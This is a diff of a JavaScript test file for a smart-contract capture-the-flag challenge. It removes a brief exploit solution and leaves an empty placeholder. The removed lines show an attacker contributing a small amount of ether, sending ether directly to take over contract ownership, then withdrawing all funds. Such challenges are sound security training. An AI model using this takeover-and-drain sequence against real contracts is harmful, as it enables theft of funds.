@@ -26,17 +26,7 @@ describe('[Challenge] Example Vuln', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
-        // Contribute to get into whitelist
-        await this.target.connect(attacker).contribute({value: some_ether});
-        // Takeover the contract's owner by sending some ethers
-        tx = {
-            to: this.target.address,
-            value: some_ether
-        };
-        await attacker.sendTransaction(tx);
-        // Withdraw all ethers in the contract
-        await this.target.connect(attacker).withdraw();
+        
     }).timeout(0);
 
     after(async () => {
